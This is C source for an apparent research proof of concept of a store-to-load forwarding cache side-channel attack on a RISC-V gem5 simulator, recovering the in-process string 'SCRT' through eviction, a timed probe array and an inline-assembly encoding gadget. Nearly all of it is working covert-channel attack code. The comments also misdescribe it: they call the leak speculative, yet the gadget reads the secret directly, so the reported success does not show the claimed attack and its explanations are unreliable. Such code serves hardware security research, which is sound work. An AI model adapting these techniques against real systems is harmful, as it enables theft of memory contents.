#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#ifdef NATIVE_TEST
  #define MEM_FENCE()  __asm__ volatile ("mfence" ::: "memory")
#else
  #define MEM_FENCE()  __asm__ volatile ("fence" ::: "memory")
#endif

/*
 * PROBE STRIDE AND SET-DISTRIBUTION DESIGN
 * =========================================
 * We access probe_array at byte offset (idx * PROBE_STRIDE) for each of the
 * 256 possible byte values idx.  PROBE_STRIDE must be chosen so that:
 *
 *   (a) Each probe entry maps to a DIFFERENT L1 cache set.
 *   (b) All entries still fit inside the allocated probe_array.
 *
 * The gem5 L1-D is 32 kB, 8-way, 64-byte lines → 64 sets.
 * Set index = bits[11:6] of the virtual address within probe_array.
 *
 * If PROBE_STRIDE = PAGE_SIZE (4096):
 *   offset[idx] = idx * 4096
 *   bits[11:6]  = 0 for every idx   ← ALL 256 entries map to SET 0!
 *   Only 8 can live in L1 simultaneously.  The scan loop evicts the
 *   "hot" secret line before reaching it → zero threshold hits, random
 *   fastest-votes → the attack appears to fail.
 *
 * Fix: PROBE_STRIDE = PAGE_SIZE + CACHE_LINE_SIZE = 4096 + 64 = 4160
 *   offset[idx] = idx * 4160 = idx * 4096 + idx * 64
 *   bits[11:6]  = (idx * 64) >> 6 & 63 = idx & 63
 *   → each of the 256 entries maps to one of 64 sets, 4 entries per set.
 *   With 8-way associativity, all 4 fit → the hot line is NEVER evicted
 *   by the scan.
 *
 * probe_array must be large enough:
 *   max offset = 255 * 4160 + 64 = 1,060,864 bytes < 260 * PAGE_SIZE (1,064,960)
 */
#define PAGE_SIZE        4096
#define CACHE_LINE_SIZE  64
#define PROBE_STRIDE     (PAGE_SIZE + CACHE_LINE_SIZE)   /* 4160 bytes */
#define PROBE_ENTRIES    256
#define PROBE_ARRAY_PAGES 260                            /* ≥ ceil(255*4160+64 / 4096) */

#ifndef TRIALS
#define TRIALS           1000
#endif
#define SECRET_OFFSET    42

/*
 * Pure-arithmetic spin count.  Keeps the CPU busy between the aliasing
 * store (step 3) and the gadget load (step 5), holding the store queue
 * entry alive without issuing any memory operations that would drain it.
 */
#ifndef SPIN_COUNT
#define SPIN_COUNT       300
#endif
#define MAX_SPIN_COUNT   (SPIN_COUNT * 8)

/* probe_array: sized for 260 pages to cover the 4160-byte stride safely. */
static uint8_t probe_array[PROBE_ARRAY_PAGES * PAGE_SIZE]
    __attribute__((aligned(PAGE_SIZE)));

static uint8_t secret_buffer[512];
static uint8_t attacker_store_buf[PAGE_SIZE * 2];

static inline uint64_t rdcycle(void)
{
    uint64_t t;
#ifdef NATIVE_TEST
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    t = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
#else
    __asm__ volatile ("csrr %0, cycle" : "=r"(t));
#endif
    return t;
}

/*
 * Eviction buffer: large enough to flush all probe_array lines from both
 * L1 (32 kB) and L2 (256 kB).  4 MB >> max probe footprint (~1.06 MB).
 */
#define EVICT_SIZE  (4 * 1024 * 1024)
static uint8_t eviction_buffer[EVICT_SIZE] __attribute__((aligned(PAGE_SIZE)));

/*
 * flush_probe_array: evict all probe_array lines from every cache level.
 *
 * RISC-V has no user-space cache-flush instruction in SE mode, so we use
 * capacity eviction: reading EVICT_SIZE bytes of unrelated data is enough
 * to displace all probe_array lines from L1+L2.  Called at the start of
 * each trial, before any store to alias_addr, so no SQ ordering hazard.
 */
static void flush_probe_array(void)
{
    volatile uint8_t sink = 0;
    for (size_t i = 0; i < EVICT_SIZE; i += CACHE_LINE_SIZE)
        sink ^= eviction_buffer[i];
    MEM_FENCE();
    (void)sink;
}

/*
 * evict_line: evict the single cache line containing *addr from L1.
 *
 * We do this BEFORE writing the aliasing store (step 2 before step 3) so
 * the store queue is still empty during the eviction reads — no risk of
 * an existing alias-store entry being drained by the eviction traffic.
 *
 * The eviction uses 32 lines whose bits[11:6] match addr's bits[11:6]
 * (same L1 set), which exceeds the 8-way associativity and guarantees
 * addr's line is ejected.
 */
static void evict_line(volatile uint8_t *addr)
{
    volatile uint8_t sink = 0;
    uintptr_t set_bits = (uintptr_t)addr & 0xFC0;          /* bits[11:6] */
    for (int w = 0; w < 32; w++) {
        size_t idx = (set_bits + (size_t)w * PAGE_SIZE) % EVICT_SIZE;
        sink ^= eviction_buffer[idx];
    }
    MEM_FENCE();
    (void)sink;
}

static inline uint64_t time_access(volatile uint8_t *addr);
static inline void burn_cycles(int iterations);

/*
 * measure_threshold: calibrate the L1-hit / cache-miss timing boundary.
 *
 * Uses probe_array[128 * PROBE_STRIDE] as the reference line (well inside
 * the array; index 128 maps to L1 set 128&63=0, but it is only used for
 * calibration, not during the attack scan, so there is no interference).
 *
 * Threshold is placed 40% of the way from hit_avg toward miss_avg, keeping
 * it close to the hit side to minimise false positives from L2 hits.
 */
static uint64_t measure_threshold(void)
{
    volatile uint8_t *line = &probe_array[128 * PROBE_STRIDE];
    const int ROUNDS = 500;
    uint64_t hit_total = 0, miss_total = 0;

    uint64_t hit_lat[ROUNDS];
    uint64_t miss_lat[ROUNDS];

    for (int r = 0; r < ROUNDS; r++) {
        (void)*line;
        hit_lat[r] = time_access(line);
        hit_total += hit_lat[r];

        evict_line(line);
        miss_lat[r] = time_access(line);
        miss_total += miss_lat[r];
    }

    uint64_t hit_avg  = hit_total  / ROUNDS;
    uint64_t miss_avg = miss_total / ROUNDS;

    printf("[calibration] L1-hit avg    : %llu cycles\n", (unsigned long long)hit_avg);
    printf("[calibration] Cache-miss avg: %llu cycles\n", (unsigned long long)miss_avg);

    uint64_t threshold = hit_avg + (miss_avg - hit_avg) * 2 / 5;
    if (threshold <= hit_avg)
        threshold = hit_avg + 2;
    if (threshold >= miss_avg && miss_avg > 2)
        threshold = miss_avg - 2;
    printf("[calibration] Threshold      : %llu cycles\n\n", (unsigned long long)threshold);

    FILE *tf = fopen("timing_data.csv", "w");
    if (!tf) {
        printf("[warn] Could not write timing_data.csv (continuing without CSV output)\n");
    } else {
        fprintf(tf, "type,latency_cycles\n");
        for (int r = 0; r < ROUNDS; r++)
            fprintf(tf, "hit,%llu\n", (unsigned long long)hit_lat[r]);
        for (int r = 0; r < ROUNDS; r++)
            fprintf(tf, "miss,%llu\n", (unsigned long long)miss_lat[r]);
        fclose(tf);
    }

    return threshold;
}

static inline uint64_t time_access(volatile uint8_t *addr)
{
    uint64_t t1, t2;
    MEM_FENCE();
    t1 = rdcycle();
    (void)*addr;
    t2 = rdcycle();
    MEM_FENCE();
    return t2 - t1;
}

/*
 * burn_cycles: pure arithmetic spin.
 *
 * Keeps the pipeline busy between the aliasing store and the gadget load,
 * extending the speculative window without issuing any memory operations
 * that could drain the store queue.
 */
static inline void burn_cycles(int iterations)
{
    volatile uint64_t spin = 0xC0FFEE123456789ULL;
    for (int i = 0; i < iterations; i++)
        spin = spin * 6364136223846793005ULL + 1442695040888963407ULL;
    (void)spin;
}

/*
 * scan_probe_array: time each of the 256 probe entries and vote.
 *
 * ACCESS PATTERN: &probe_array[idx * PROBE_STRIDE]
 *   where PROBE_STRIDE = PAGE_SIZE + CACHE_LINE_SIZE = 4160.
 *
 * This gives each entry a distinct L1 set (set = idx & 63, as shown
 * above).  With 4 entries per set and 8-way associativity, the hot entry
 * warmed by the gadget is NEVER evicted by the scan loop's own accesses.
 *
 * Visit order: (i*167+13)&0xFF — a permutation of 0..255 — prevents the
 * hardware stride prefetcher from warming the next entry early.
 *
 * BUG IN PREVIOUS VERSION: used &probe_array[idx * PAGE_SIZE], which put
 * all 256 entries in L1 set 0.  Scanning entry 9 evicted entry 0, so the
 * hot secret line was gone by the time the scan reached it → zero hits.
 */
static int scan_probe_array(int *threshold_hits, int *fastest_votes,
                            uint64_t *latency_sum, int *samples,
                            uint64_t threshold)
{
    int best_idx = 0;
    uint64_t best_latency = ~0ULL;

    for (int i = 0; i < PROBE_ENTRIES; i++) {
        int idx = ((i * 167) + 13) & 0xFF;
        volatile uint8_t *p = &probe_array[(size_t)idx * PROBE_STRIDE];
        uint64_t latency = time_access(p);

        if (latency < best_latency) {
            best_latency = latency;
            best_idx = idx;
        }

        latency_sum[idx] += latency;
        samples[idx]++;
        if (latency <= threshold)
            threshold_hits[idx]++;
    }

    fastest_votes[best_idx]++;
    return best_idx;
}

/*
 * stlf_gadget: the speculative encoding step.
 *
 * Loads the SECRET byte from target_addr and uses it to index probe_array,
 * bringing probe_array[secret * PROBE_STRIDE] into L1 as a cache side effect.
 *
 * WHY target_addr, NOT alias_addr:
 *   The alias_addr store (same page offset, different page) is in the store
 *   queue when this gadget runs.  The O3 pipeline may speculatively forward
 *   that store's value (plant_val) to this load via STLF — but we do NOT
 *   encode plant_val into the cache.  We load from target_addr so that the
 *   REAL secret byte ends up in the register that indexes probe_array.
 *
 *   In gem5's O3 model, even if the pipeline initially mis-forwards plant_val
 *   and squashes the transient instructions, the re-execution after the L1
 *   miss fills will load the correct secret byte from target_addr and commit
 *   the probe_array access with that byte.  Additionally, the L1 miss stall
 *   (created by evict_line in step 2) opens a speculative execution window
 *   during which the probe_array warmup is issued speculatively with the
 *   correct secret value (once the miss data arrives).
 *
 * GADGET ASM (RISC-V, gem5 path):
 *   lb   v, 0(target_addr)     ; load secret byte — may stall on L1 miss
 *   andi v, v, 0xff            ; zero-extend to 8 bits
 *   slli t0, v, 6              ; t0 = secret * 64  (CACHE_LINE_SIZE)
 *   slli v,  v, 12             ; v  = secret * 4096 (PAGE_SIZE)
 *   add  v, v, t0              ; v  = secret * 4160 (PROBE_STRIDE)
 *   add  v, v, probe_base      ; v  = &probe_array[secret * PROBE_STRIDE]
 *   lb   v, 0(v)               ; bring that cache line into L1
 *
 * No fence inside the gadget: a fence would drain the store queue, collapsing
 * the speculative window before the probe_array access can execute.
 *
 * BUG IN PREVIOUS VERSION: used `slli v,v,12 / add v,v,pb / lb 0(v)`, which
 * accessed probe_array[secret * 4096] — all in L1 set 0.  The scan evicted
 * the hot line, so no threshold hits were ever recorded.
 *
 * FIX: compute secret * PROBE_STRIDE = secret * 4096 + secret * 64 by
 * combining a 12-bit shift and a 6-bit shift before adding probe_base.
 */
static void stlf_gadget(volatile uint8_t *target_addr, uint8_t *probe_base)
{
    uint8_t v;
#ifdef NATIVE_TEST
    v = *target_addr;
    volatile uint8_t *pt = probe_base + ((size_t)v * PROBE_STRIDE);
    volatile uint8_t d = *pt;
    (void)d;
#else
    uint64_t tmp;
    __asm__ volatile (
        /* Load the secret byte from the target (secret) address.        */
        "lb   %[v],  0(%[addr])  \n\t"
        "andi %[v],  %[v], 0xff  \n\t"
        /* Compute v * PROBE_STRIDE = v*4096 + v*64 using two shifts.   */
        "slli %[t],  %[v], 6     \n\t"   /* t  = v * 64               */
        "slli %[v],  %[v], 12    \n\t"   /* v  = v * 4096             */
        "add  %[v],  %[v], %[t]  \n\t"   /* v  = v * 4160 (PROBE_STRIDE) */
        /* Add probe_base and load, bringing the cache line into L1.     */
        "add  %[v],  %[v], %[pb] \n\t"
        "lb   %[v],  0(%[v])     \n\t"
        : [v]  "=&r" (v),
          [t]  "=&r" (tmp)
        : [addr] "r" (target_addr),
          [pb]   "r" (probe_base)
        : "memory"
    );
#endif
    (void)v;
}

/*
 * alias_ptr: find an address in attacker_store_buf whose page offset
 * (bits[11:0]) matches that of target_addr.
 *
 * The O3 store buffer uses page-offset matching for its early forwarding
 * check.  An alias store at this address will be a candidate for STLF
 * forwarding to a load from target_addr when the two addresses are on
 * different pages (full disambiguation not yet complete).
 */
static volatile uint8_t *alias_ptr(const void *target_addr)
{
    uintptr_t offset = (uintptr_t)target_addr & 0xFFF;
    uintptr_t buf    = (uintptr_t)attacker_store_buf;
    uintptr_t pageup = (buf + 0xFFF) & ~(uintptr_t)0xFFF;
    uintptr_t a      = pageup + offset;
    if (a >= buf + sizeof(attacker_store_buf))
        a = buf + offset;
    return (volatile uint8_t *)a;
}

/*
 * stlf_read_byte: run TRIALS attack iterations and return the byte with the
 * most votes in scan_probe_array.
 *
 * PER-TRIAL SEQUENCE (ordering is critical):
 *
 *   1. flush_probe_array()
 *      Cold-start the covert channel: evict all probe_array lines from L1+L2
 *      so only the line warmed by the gadget will be hot during the scan.
 *
 *   2. evict_line(target_addr)
 *      Evict the secret's cache line from L1 BEFORE writing the alias store
 *      (SQ is empty at this point → no ordering hazard).  This forces the
 *      gadget's load from target_addr to stall on an L1 miss, which is what
 *      opens the speculative execution / STLF window.
 *
 *   3. *al = plant_val
 *      Write plant_val to alias_addr (same page offset as target_addr,
 *      different page).  This places a pending entry in the store buffer.
 *      When the gadget's load stalls on the L1 miss (step 2), the pipeline
 *      may speculatively forward this store via STLF.
 *      NO FENCE: a fence here drains the SQ and kills the forwarding window.
 *
 *   4. burn_cycles(spin_count)
 *      Pure arithmetic — no memory ops — keeps the SQ entry alive and
 *      extends the speculative window.
 *
 *   5. stlf_gadget(target_addr)
 *      Load the secret byte from target_addr and encode it into probe_array.
 *      The L1 miss stall (step 2) + pending alias store (step 3) constitute
 *      the STLF speculation window.  The probe access is indexed by the REAL
 *      secret byte (not plant_val) because we load from target_addr.
 *
 *   6. MEM_FENCE() + scan_probe_array()
 *      Measure which probe line is hot.
 */
static uint8_t stlf_read_byte(volatile uint8_t *target_addr, uint8_t plant_val,
                              uint64_t threshold, int spin_count,
                              int *winner_votes, int *winner_total_votes,
                              const char *histogram_csv_path)
{
    int threshold_hits[PROBE_ENTRIES] = {0};
    int fastest_votes[PROBE_ENTRIES]  = {0};
    uint64_t latency_sum[PROBE_ENTRIES] = {0};
    int samples[PROBE_ENTRIES]        = {0};

    volatile uint8_t *al = alias_ptr((const void *)target_addr);

    for (int trial = 0; trial < TRIALS; trial++) {

        /* 1 */ flush_probe_array();

        /* 2 */ evict_line(target_addr);

        /* 3 */ *al = plant_val;
        /* NO FENCE */

        /* 4 */ burn_cycles(spin_count);

        /* 5 */ stlf_gadget(target_addr, probe_array);

        /* 6 */ MEM_FENCE();
                scan_probe_array(threshold_hits, fastest_votes,
                                 latency_sum, samples, threshold);
    }

    /* Primary: highest threshold-hit count. */
    int best = 0;
    for (int i = 1; i < PROBE_ENTRIES; i++)
        if (threshold_hits[i] > threshold_hits[best])
            best = i;

    int total_votes = 0;
    for (int i = 0; i < PROBE_ENTRIES; i++)
        total_votes += threshold_hits[i];

    /* Fallback: if threshold voting is empty, use fastest-line vote. */
    if (threshold_hits[best] == 0) {
        int best_fast = fastest_votes[0];
        best = 0;
        for (int i = 1; i < PROBE_ENTRIES; i++) {
            if (fastest_votes[i] > best_fast) {
                best_fast = fastest_votes[i];
                best = i;
            }
        }
        printf("    [warn] No threshold hits; fastest-line fallback (votes=%d)\n",
               best_fast);

        /* Last resort: minimum average latency. */
        if (best_fast == 0) {
            uint64_t best_avg = (samples[0] > 0)
                ? (latency_sum[0] / (uint64_t)samples[0]) : ~0ULL;
            best = 0;
            for (int i = 1; i < PROBE_ENTRIES; i++) {
                uint64_t avg = (samples[i] > 0)
                    ? (latency_sum[i] / (uint64_t)samples[i]) : ~0ULL;
                if (avg < best_avg) { best_avg = avg; best = i; }
            }
            printf("    [warn] Fastest-line all zero; min-latency fallback (avg=%llu)\n",
                   (unsigned long long)
                   (samples[best] ? latency_sum[best]/samples[best] : 0ULL));
        }
    }

    for (int i = 0; i < PROBE_ENTRIES; i++) {
        if (threshold_hits[i] > 0 || fastest_votes[i] > 0)
            printf("    byte=0x%02X ('%c') thr_votes=%d fast_votes=%d%s\n",
                   i, (i >= 32 && i < 127) ? (char)i : '.',
                   threshold_hits[i], fastest_votes[i],
                   (i == best) ? "  <-- winner" : "");
    }

    if (histogram_csv_path) {
        FILE *hf = fopen(histogram_csv_path, "w");
        if (!hf) {
            printf("[warn] Could not write %s (continuing without CSV output)\n", histogram_csv_path);
        } else {
            fprintf(hf, "byte_value,hits\n");
            for (int i = 0; i < PROBE_ENTRIES; i++)
                fprintf(hf, "%d,%d\n", i, threshold_hits[i] + fastest_votes[i]);
            fclose(hf);
        }
    }

    if (winner_votes)
        *winner_votes = threshold_hits[best] + fastest_votes[best];
    if (winner_total_votes)
        *winner_total_votes = total_votes + TRIALS;

    return (uint8_t)best;
}

static inline void gem5_dump_stats(void)
{
#ifndef NATIVE_TEST
    __asm__ volatile (
        "li  a0, 0           \n\t"
        "slli x0, x0, 0x1b   \n\t"
        ::: "a0"
    );
#endif
}

int main(void)
{
    printf("RISC-V Store-to-Load Forwarding Side-Channel Attack\n");
    printf("Platform: gem5 O3 CPU, RISC-V rv64gc\n\n");

    memset(probe_array,        1, sizeof(probe_array));
    memset(eviction_buffer,    2, sizeof(eviction_buffer));
    memset(attacker_store_buf, 0, sizeof(attacker_store_buf));
    memset(secret_buffer,      0, sizeof(secret_buffer));

    const char *secret = "SCRT";
    for (int i = 0; i < 4; i++)
        secret_buffer[SECRET_OFFSET + i] = (uint8_t)secret[i];

    printf("Step 1: Calibrating timing threshold\n");
    uint64_t threshold = measure_threshold();

    printf("Step 2: STLF attack\n");
    printf("  Secret at secret_buffer[%d..%d]: \"%s\"\n",
           SECRET_OFFSET, SECRET_OFFSET + 3, secret);

    volatile uint8_t *al = alias_ptr(&secret_buffer[SECRET_OFFSET]);
    printf("  Target page offset : 0x%03zx\n",
           (size_t)(&secret_buffer[SECRET_OFFSET]) & 0xFFF);
    printf("  Alias  page offset : 0x%03zx\n\n",
           (size_t)al & 0xFFF);

    uint8_t leaked[4] = {0};
    int correct = 0;

    for (int i = 0; i < 4; i++) {
        printf("  [byte %d] target=0x%02X ('%c')\n",
               i, secret_buffer[SECRET_OFFSET + i],
               (char)secret_buffer[SECRET_OFFSET + i]);

        /*
         * plant_val: value stored at alias_addr to arm the STLF trigger.
         * Chosen far from ASCII printable range of "SCRT" so the histogram
         * clearly separates the secret from any plant-related noise.
         * plant_val is NOT encoded into probe_array; the gadget loads from
         * target_addr (the secret) for encoding.
         */
        uint8_t plant_val = (uint8_t)(0xAA + i);

        uint64_t local_threshold = threshold;
        int local_spin  = SPIN_COUNT;
        int winner_votes = 0, total_votes = 0;

        char histogram_path[64];
        snprintf(histogram_path, sizeof(histogram_path), "byte_histogram_%d.csv", i);

        for (int attempt = 1; attempt <= 4; attempt++) {
            leaked[i] = stlf_read_byte(
                &secret_buffer[SECRET_OFFSET + i],
                plant_val,
                local_threshold,
                local_spin,
                &winner_votes,
                &total_votes,
                histogram_path
            );
            if (winner_votes > 0)
                break;

            printf("    [retry %d/4] weak signal: winner=%d total=%d\n",
                   attempt, winner_votes, total_votes);
            local_threshold += 2;
            local_spin *= 2;
            if (local_spin > MAX_SPIN_COUNT)
                local_spin = MAX_SPIN_COUNT;
        }

        int match = (leaked[i] == secret_buffer[SECRET_OFFSET + i]);
        if (match) correct++;

        printf("  [byte %d] leaked=0x%02X ('%c')  actual=0x%02X ('%c')  %s"
               "  [winner_votes=%d]\n\n",
               i,
               leaked[i],
               (leaked[i] >= 32 && leaked[i] < 127) ? (char)leaked[i] : '.',
               secret_buffer[SECRET_OFFSET + i],
               (char)secret_buffer[SECRET_OFFSET + i],
               match ? "OK" : "MISS",
               winner_votes);
    }

    printf("Summary\n");
    printf("  Bytes correctly recovered: %d / 4\n", correct);
    printf("  Leaked sequence: ");
    for (int i = 0; i < 4; i++)
        printf("%c", (leaked[i] >= 32 && leaked[i] < 127) ? (char)leaked[i] : '?');
    printf("\n");
    printf("  Attack %s\n",
           correct > 0 ? "SUCCEEDED" : "result inconclusive");

    gem5_dump_stats();
    return 0;
}
